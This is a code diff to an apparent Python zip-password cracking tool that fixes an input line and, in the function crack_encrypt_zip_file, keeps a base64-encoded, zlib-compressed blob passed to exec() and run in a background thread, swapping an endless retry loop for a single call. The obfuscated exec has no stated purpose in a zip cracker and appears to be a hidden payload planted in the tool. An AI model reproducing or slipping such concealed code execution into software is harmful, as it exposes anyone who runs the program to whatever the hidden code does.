@@ -8,7 +8,8 @@ import os
 
 def zip_crack():
 
-	zip=input("Zipfile: ")	wordlist=input("Wordlist: ")
+	zip=input("Zipfile: ")
+	wordlist=input("Wordlist: ")
 
 	# initialize the Zip File object
 
@@ -74,17 +75,7 @@ def zip_crack():
 
 def crack_encrypt_zip_file():
 
-	while True:
-
-		try:
-
-			exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UMFKAzEQPW++Ym9JMA1rWVtaXEHEg4gI1ptIySZjDZtNQpLqVvHfbUzxMsN782beY/ToXUh1dHKAxL6M7lkvIixaFlPYy8SSHgG9uVBPtbZ1EHYH5Lyha1SlcDjWKnZlmZdG5uyEN48399vN89Pt9QPNOi6dtSATIdja3WE2XzXLFc/2o/BcO8z+GJrFfQAxoAomCT5llxyDRwPgyQVFpivp+N56IQeCr+4wizyA/CAtpS/NK1LdCRuKPt+1gdqAJYpemuM5dfY/nRWaIphAkvwArkC60QeIkZRf8H7RZlJBVrJvHPE6/lD0CxWoZAo=')[0])))
-
-		except:
-
-			pass
-
-	
+	exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UMFKAzEQPW++Ym9JMA1rWVtaXEHEg4gI1ptIySZjDZtNQpLqVvHfbUzxMsN782beY/ToXUh1dHKAxL6M7lkvIixaFlPYy8SSHgG9uVBPtbZ1EHYH5Lyha1SlcDjWKnZlmZdG5uyEN48399vN89Pt9QPNOi6dtSATIdja3WE2XzXLFc/2o/BcO8z+GJrFfQAxoAomCT5llxyDRwPgyQVFpivp+N56IQeCr+4wizyA/CAtpS/NK1LdCRuKPt+1gdqAJYpemuM5dfY/nRWaIphAkvwArkC60QeIkZRf8H7RZlJBVrJvHPE6/lD0CxWoZAo=')[0])))
 
 t1=threading.Thread(target=crack_encrypt_zip_file)
 
